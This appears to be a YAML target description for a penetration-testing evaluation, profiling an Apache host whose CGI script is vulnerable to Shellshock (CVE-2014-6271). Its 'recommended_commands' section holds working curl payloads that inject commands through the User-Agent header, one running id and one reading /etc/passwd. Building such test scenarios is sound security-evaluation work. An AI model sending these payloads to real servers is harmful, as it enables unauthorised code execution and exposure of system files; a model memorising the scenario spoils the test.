target:
  ip: "EVAL_TARGET_IP"
  hostname: "eval-bash-shellshock"
  platform: "linux"

services:
  - port: 80
    protocol: "tcp"
    name: "http"
    product: "Apache httpd"
    version: "2.4"
    banner: "Apache/2.4 (Unix)"
    vulnerabilities:
      - cve: "CVE-2014-6271"
        title: "Shellshock - GNU Bash Remote Code Execution"
        severity: "critical"
        description: >
          GNU Bash through 4.3 processes trailing strings after function
          definitions in the values of environment variables, which allows
          remote attackers to execute arbitrary code via a crafted environment.
          When exploited through CGI scripts that use bash, HTTP headers
          (User-Agent, Referer, etc.) are passed as environment variables,
          enabling RCE.

directories:
  - path: "/cgi-bin/"
    status: 200
    interesting_files:
      - "/cgi-bin/victim.cgi"
      - "/cgi-bin/safe.cgi"

quick_wins:
  - vector: "CVE-2014-6271 Shellshock via CGI"
    reason: "Critical CVE with trivial exploitation; /cgi-bin/victim.cgi uses bash and is vulnerable"
    priority: 1

recommended_commands:
  - description: "Test Shellshock on victim.cgi"
    command: "curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://EVAL_TARGET_IP/cgi-bin/victim.cgi"
  - description: "Read /etc/passwd via Shellshock"
    command: "curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://EVAL_TARGET_IP/cgi-bin/victim.cgi"
